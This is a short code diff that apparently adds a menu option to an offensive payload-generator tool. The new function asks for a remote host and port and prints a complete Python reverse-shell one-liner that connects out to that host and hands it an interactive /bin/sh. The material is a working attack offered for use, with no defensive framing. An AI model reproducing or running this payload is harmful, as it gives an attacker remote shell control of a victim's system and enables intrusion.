@@ -47,3 +47,22 @@ def payfac():
        input('press enter')
        a_main()
 
+def payfac2():
+       print('  Python Reverse Shell')
+       try:
+              rhost = input('  Set Host: ')
+              print('  [\033[1;32mOK\033[0;0m] - Remote Host: ', rhost)
+       except:
+              a_main()
+       try:
+              rport = int(input('  Set Port: '))
+              print('  [\033[1;32mOK\033[0;0m] - Remote port: ', rport)
+       except:
+              a_main()
+
+       print("""
+       python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+       """.format(rhost,rport))
+
+       input('press enter')
+       a_main.a_main()
